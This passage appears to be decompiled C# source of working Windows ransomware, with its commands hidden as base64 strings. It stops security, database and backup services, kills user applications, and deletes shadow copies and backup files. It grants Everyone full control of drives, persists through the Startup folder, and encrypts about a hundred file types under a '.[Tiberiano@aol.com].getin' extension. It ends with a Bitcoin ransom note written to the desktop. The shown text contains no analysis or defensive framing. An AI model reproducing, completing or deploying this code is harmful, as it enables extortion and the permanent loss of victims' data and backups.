		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		XKJIixIieoUFn("c3RvcCBzd2lfdXBkYXRlIC95"),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		XKJIixIieoUFn("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		XKJIixIieoUFn("c3RvcCBUbUNDU0YgL3k="),
		XKJIixIieoUFn("c3RvcCBTUUxCcm93c2VyIC95"),
		XKJIixIieoUFn("c3RvcCB0bWxpc3RlbiAveQ=="),
		XKJIixIieoUFn("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		XKJIixIieoUFn("c3RvcCBUcnVlS2V5IC95"),
		XKJIixIieoUFn("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		XKJIixIieoUFn("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		XKJIixIieoUFn("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		XKJIixIieoUFn("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		XKJIixIieoUFn("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		XKJIixIieoUFn("c3RvcCBXUlNWQyAveQ=="),
		XKJIixIieoUFn("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		XKJIixIieoUFn("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> qxxQfIPOBMpMzFB = new List<string>
	{
		XKJIixIieoUFn("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		XKJIixIieoUFn("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		XKJIixIieoUFn("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		XKJIixIieoUFn("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		XKJIixIieoUFn("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		XKJIixIieoUFn("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		XKJIixIieoUFn("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		XKJIixIieoUFn("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> vqSvbuvOlqTPkNEZ = new List<string>
	{
		XKJIixIieoUFn("L0lNIG1zcHViLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		XKJIixIieoUFn("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIG15c3FsZC5leGUgL0Y="),
		XKJIixIieoUFn("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIGFnbnRzdmMuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIHRoZWJhdC5leGUgL0Y="),
		XKJIixIieoUFn("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIGVuY3N2Yy5leGUgL0Y="),
		XKJIixIieoUFn("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIENOVEFvU01nci5leGUgL0Y="),
		XKJIixIieoUFn("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		XKJIixIieoUFn("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIGRiZW5nNTAuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIG9jb21tLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIHpvb2x6LmV4ZSAvRg=="),
		XKJIixIieoUFn("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIGRic25tcC5leGUgL0Y="),
		XKJIixIieoUFn("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		XKJIixIieoUFn("L0lNIG1zcHViLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIG9uZW5vdGUuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIG91dGxvb2suZXhlIC9G"),
		XKJIixIieoUFn("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		XKJIixIieoUFn("L0lNIHZpc2lvLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIHdpbndvcmQuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		XKJIixIieoUFn("L0lNIHdvcmRwYWQuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIG9jc3NkLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIG9yYWNsZS5leGUgL0Y="),
		XKJIixIieoUFn("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		XKJIixIieoUFn("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		XKJIixIieoUFn("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> fAlQHXxZrRxGqqm = new List<string>
	{
		XKJIixIieoUFn(zzsZUpEDaqFx("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		XKJIixIieoUFn("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		XKJIixIieoUFn(zzsZUpEDaqFx("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

	public static string NakyyfyCidlkEyZM = XKJIixIieoUFn("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> LszFxvCKWvtOQXb = new List<string>
	{
		XKJIixIieoUFn("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		XKJIixIieoUFn("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		XKJIixIieoUFn("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		XKJIixIieoUFn("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		XKJIixIieoUFn("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		XKJIixIieoUFn("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> QWLDEQKWGEtG = new List<string>
	{
		XKJIixIieoUFn("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		XKJIixIieoUFn("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		XKJIixIieoUFn("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string fPIWgCcxtFxYM = "NO";

	public static string XtbFMwRPNfh = "NO";

	internal static DateTime MquyFknNwxS = new DateTime(2000, 1, 1);

	internal static DateTime aAIDgdgFizzl = new DateTime(2100, 1, 1);

	public static string MsXKPMolFXtq = "YES";

	public static string dlYfCorqiUsc = "10";

	public static string UnfpOapZCJmOKy = "NO";

	public static string HuQFQlRSCWwDJBT = "NO";

	public static string pvcirBYageNYmWD = "NO";

	public static string ajpEFjIXuLTdU = "YES";

	public static string zWCXehGIoycxXzO = "NO";

	public static string EpcuvjLUVs = "NO";

	public static List<string> QEQDItjwRt = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string PyEgbvgDxtxm = "NO";

	public static string WTlibewEpYC = "1";

	public static string hpMLSKQlBNaaVC = "NO";

	public static string ZMkmxcVENGylaUJ = "NO";

	public static string ShjmxCifkpQ = "NO";

	public static string majPzACQkKB = string.Empty;

	public static string aBgIVhUGziRZUvnD = "NO";

	public static string yAEYWyKygPIDYbHfZ = "NO";

	public static string yJjHAABfaYRaCCE = "NO";

	public static string DlmIgmSLlH = "";

	public static string gNZCYQWbkSAH = "";

	public static string meRFnnicMNL = "NO";

	public static string xwrteIaCnD = "YES";

	public static string MpjSKlCTIVmms = "YES";

	public static string rmybITPjHtaQrPRPyI = "NO";

	public static string LofPVqpdVF = "NO";

	public static string pvKoOSXwJzG = "LOGONISOFF";

	public static string PxboXPBwwcEC = "NO";

	public static string auzZFIZJxkg = "YES";

	public static string GkzMChUYOUNM = "mystartup.lnk";

	public static string TiRnMaBpzkm = "NO";

	public static string HOIdWQrVwySmjxOT = "NO";

	public static string loOsBKSBxFRcB = "NO";

	public static string QDYzmvMZSfji = "NO";

	public static string JKVVItJdvPVmBoQr = "VGhhbm9z";

	public static string QgecHpRcdMhrof = "YES";

	public static string rIDbJCbxXGOM = "YES";

	public static string oSzhfTsYtQ = "NO";

	public static string LOgnTGWpyqwcGR = "NO";

	public static string[] TnKKArGCBddMn = new string[0];

	public static string LlSPMTfPkGWMM = "NO";

	public static bool WKWPaQWPQqrRRB = true;

	public static string ZYEzlwleTiTnkN = "NO";

	public static bool xSIJBVFhcrJvfz = false;

	public static bool rpMaqoBgWkMBW = false;

	public static bool vhVfyMpOwgk = false;

	public static bool SeIVHExHnFbe = false;

	public static string kCftkBXDnujA = "Debug_Log.txt";

	public static bool HRuXHUgomikt = false;

	public static bool NCDJhjhxMjo = true;

	public static bool NKRltNJxdjrB = false;

	public static bool DkGKAkKksBrre = false;

	public static bool KTdzEFOlwiRwULiD = true;

	public static string TRKfvCCpnWOZ = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + CmYAejDgYJsctGHm.tGhpPKuyPxdeK() + ".txt";

	public static bool mGPgYiqNVpxAeD = true;

	public static Stopwatch eulLLquaCJeYr = new Stopwatch();

	public static int WEeJdcZxxnxI = 0;

	public static int VnshRzSTFwJvI = 0;

	public static bool YxnJxsROHGpBEI = true;

	public static string sPVXhXLBBzIUR = ".[ID-" + CmYAejDgYJsctGHm.tGhpPKuyPxdeK() + "]";

	public static string[] imFuWqviuFOti = new string[1] { "\"db\",\"dbf\",\"accdb\",\"dbx\",\"mdb\",\"mdf\",\"epf\",\"ndf\",\"ldf\",\"1cd\",\"sdf\",\"nsf\",\"fp7\",\"cat\",\"log\"" };

	public static List<string> kpbBxwbeqJxuMM = new List<string>();

	public static int PAsRAwMADTR = 0;

	public static List<string> rpGvmuBdwBJBrud = new List<string>();

	public static List<string> kqvKiTkvxzHM = new List<string>();

	public static List<string> PWgmebPKSHPlQKV = new List<string>();

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	private static void Main(string[] args)
	{
		try
		{
			ppPyBrDmgRzq CS_0024_003C_003E8__locals0 = new ppPyBrDmgRzq();
			CS_0024_003C_003E8__locals0.IbsZtgovtBL = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.IbsZtgovtBL) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			GoOEcEMheoQMi.kyYkSmadTvrjM(YkBnxFuKAwalD);
		}
		catch (Exception)
		{
		}
		try
		{
			if (QgecHpRcdMhrof == "YES")
			{
				Thread thread = new Thread(VUphdKkzqBdU.jlreIdLaRSiBO);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (zwLcwXEwLOwDWx == "YES")
		{
			Thread.Sleep(int.Parse(jvwsKlQfzaVVYbt));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && zWCXehGIoycxXzO == "YES")
		{
			try
			{
				UjWDfWwPuJs(XKJIixIieoUFn("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		try
		{
			if (ennvtZzudOjJq == "YES" && sVSDuesjpSf.XMuFMqOpReiu())
			{
				new zZxyWNJYAkMo().sZUDoBTOVmFKt(bool_0: false);
				sVSDuesjpSf.wKTaclZSCPxfXn();
			}
		}
		catch (Exception)
		{
		}
		if (PYSjDtuMTtaP == "YES" && sVSDuesjpSf.XMuFMqOpReiu())
		{
			new zZxyWNJYAkMo().sZUDoBTOVmFKt(bool_0: false);
			new zZxyWNJYAkMo().vwyzSlmbImtw();
		}
		if (ZAcsbWaNoRW == "YES")
		{
			jwZotpDcjZpX.wLywdYPxDYvrnU();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (RawdrxWIoDQ == "YES" && fileName != text2)
			{
				Thread thread2 = new Thread(mkkQKvYnpGX);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (kfRMlSyYAzKU == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					BXWJcdMyLJofUC = vutfsBLsCQB(0, fZsCNNIhJxZ.Count);
					File.Copy(fileName, text + fZsCNNIhJxZ[BXWJcdMyLJofUC], overwrite: true);
					Process.Start(text + fZsCNNIhJxZ[BXWJcdMyLJofUC]);
					mWgakOzIXDFLwyIcHK();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (fPIWgCcxtFxYM == "YES" && DateTime.Now < MquyFknNwxS)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (XtbFMwRPNfh == "YES" && DateTime.Now > aAIDgdgFizzl)
			{
				mWgakOzIXDFLwyIcHK();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = "This console window will close by itself. DON'T CLOSE IT MANUALLY OR THE WHOLE PROCESS WILL TERMINATE!";
			if (xwrteIaCnD == "YES")
			{
				Console.WriteLine("Network scanning in process...");
			}
			eulLLquaCJeYr.Start();
		}
		catch
		{
		}
		qjYSJxRuGcjBQqN();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> source = qxxQfIPOBMpMzFB;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						kpitRsUfUPt(XKJIixIieoUFn("c2MuZXhl"), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> source2 = vqSvbuvOlqTPkNEZ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						kpitRsUfUPt(XKJIixIieoUFn("dGFza2tpbGwuZXhl"), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (LOgnTGWpyqwcGR == "YES")
				{
					string[] tnKKArGCBddMn = TnKKArGCBddMn;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							kpitRsUfUPt(XKJIixIieoUFn("dGFza2tpbGwuZXhl"), "/IM " + string_0 + " /f");
						};
					}
					Parallel.ForEach(tnKKArGCBddMn, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!gotnrzqTwtuXaGE().Contains("XP"))
				{
					gevYUdZEuEUkvJoG(NakyyfyCidlkEyZM);
				}
				else
				{
					List<string> source3 = fAlQHXxZrRxGqqm;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							kpitRsUfUPt(XKJIixIieoUFn(zzsZUpEDaqFx("lhXZu4WatRWYzNnd")), string_0);
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> lszFxvCKWvtOQXb = LszFxvCKWvtOQXb;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						kpitRsUfUPt(XKJIixIieoUFn("ZGVsLmV4ZQ=="), string_0);
					};
				}
				Parallel.ForEach(lszFxvCKWvtOQXb, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		if (xwrteIaCnD == "NO")
		{
			kVFVpxHvum();
		}
		if (xwrteIaCnD == "YES")
		{
			try
			{
				VGyXmLKVRNf();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && vhVfyMpOwgk)
			{
				try
				{
					Thread thread4 = new Thread(QvBSRPUHbZO.GKImAWgxGmb);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			kpitRsUfUPt("cmd.exe", XKJIixIieoUFn("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
		}
		if (FaEBZbAJXofSn == "YES" && zlbfMUOYxADw() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(IvbJmHRnKzXS.vLqzXpzDKrI);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = GohPNLxtaI == "YES";
		SecureString secureString = new SecureString();
		if (UnfpOapZCJmOKy == "NO")
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			FDEMDnoDkQOCHM = "RFFFWD5X9PTJG6GWXOEU4A2VAXNUTAH6";
		}
		EYfwAXYBCnnA = SkKwndcWHaj.LJWdNIWcIsNR(NEbmKrywKGUTpZ(secureString));
		if (NKRltNJxdjrB)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), TRKfvCCpnWOZ)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), TRKfvCCpnWOZ), string.Concat(XKJIixIieoUFn("Q2xpZW50IElQOiA="), new WebClient().DownloadString(XKJIixIieoUFn("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", XKJIixIieoUFn("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", XKJIixIieoUFn("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), EYfwAXYBCnnA));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), TRKfvCCpnWOZ), "\r\nAdditional KeyID: " + EYfwAXYBCnnA);
				}
			}
			catch (Exception ex7)
			{
				if (HRuXHUgomikt)
				{
					try
					{
						File.AppendAllText(kCftkBXDnujA, "Error while creating Local Report: " + ex7.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		eDRWnloHopvnkH.rPeDkwFjXbIRt(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), GkzMChUYOUNM), hselTMavQtkB(EYfwAXYBCnnA), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			JIRmedCilrZR();
		}
		try
		{
			try
			{
				if (mGPgYiqNVpxAeD)
				{
					Console.WriteLine("Files securing is about to start...");
				}
			}
			catch
			{
			}
			tasLsUSzKYgWhi(new string[1] { "[auto]" }, new string[100]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
				"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
				"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
				"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
			}, new string[0], NEbmKrywKGUTpZ(secureString), ".[Tiberiano@aol.com].getin");
		}
		catch (Exception ex9)
		{
			if (HRuXHUgomikt)
			{
				try
				{
					File.AppendAllText(kCftkBXDnujA, "Finish process: " + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				streamWriter.WriteLine(XKJIixIieoUFn("QWxsIHlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZCBkdWUgdG8gYSBzZWN1cml0eSBwcm9ibGVtIHdpdGggeW91ciBQQy4gSWYgeW91IHdhbnQgdG8gcmVzdG9yZSB0aGVtLCB3cml0ZSB1cyB0byB0aGUgZS1tYWlsIFRpYmVyaWFub0Bhb2wuY29tDQpZb3UgaGF2ZSB0byBwYXkgZm9yIGRlY3J5cHRpb24gaW4gQml0Y29pbnMuIFRoZSBwcmljZSBkZXBlbmRzIG9uIGhvdyBmYXN0IHlvdSB3cml0ZSB0byB1cy4gQWZ0ZXIgcGF5bWVudCB3ZSB3aWxsIHNlbmQgeW91IHRoZSB0b29sIHRoYXQgd2lsbCBkZWNyeXB0IGFsbCB5b3VyIGZpbGVzLiANCkZyZWUgZGVjcnlwdGlvbiBhcyBndWFyYW50ZWUNCkJlZm9yZSBwYXlpbmcgeW91IGNhbiBzZW5kIHVzIHVwIHRvIDUgZmlsZXMgZm9yIGZyZWUgZGVjcnlwdGlvbi4gVGhlIHRvdGFsIHNpemUgb2YgZmlsZXMgbXVzdCBiZSBsZXNzIHRoYW4gNE1iIChub24gYXJjaGl2ZWQpLCBhbmQgZmlsZXMgc2hvdWxkIG5vdCBjb250YWluIHZhbHVhYmxlIGluZm9ybWF0aW9uLiAoZGF0YWJhc2VzLGJhY2t1cHMsIGxhcmdlIGV4Y2VsIHNoZWV0cywgZXRjLikgDQpIb3cgdG8gb2J0YWluIEJpdGNvaW5zDQpUaGUgZWFzaWVzdCB3YXkgdG8gYnV5IGJpdGNvaW5zIGlzIExvY2FsQml0Y29pbnMgc2l0ZS4gWW91IGhhdmUgdG8gcmVnaXN0ZXIsIGNsaWNrICdCdXkgYml0Y29pbnMnLCBhbmQgc2VsZWN0IHRoZSBzZWxsZXIgYnkgcGF5bWVudCBtZXRob2QgYW5kIHByaWNlLiANCmh0dHBzOi8vbG9jYWxiaXRjb2lucy5jb20vYnV5X2JpdGNvaW5zIA0KQWxzbyB5b3UgY2FuIGZpbmQgb3RoZXIgcGxhY2VzIHRvIGJ1eSBCaXRjb2lucyBhbmQgYmVnaW5uZXJzIGd1aWRlIGhlcmU6IA0KaHR0cDovL3d3dy5jb2luZGVzay5jb20vaW5mb3JtYXRpb24vaG93LWNhbi1pLWJ1eS1iaXRjb2lucy8gDQpBdHRlbnRpb24hDQpEbyBub3QgcmVuYW1lIGVuY3J5cHRlZCBmaWxlcy4gDQpEbyBub3QgdHJ5IHRvIGRlY3J5cHQgeW91ciBkYXRhIHVzaW5nIHRoaXJkIHBhcnR5IHNvZnR3YXJlLCBpdCBtYXkgY2F1c2UgcGVybWFuZW50IGRhdGEgbG9zcy4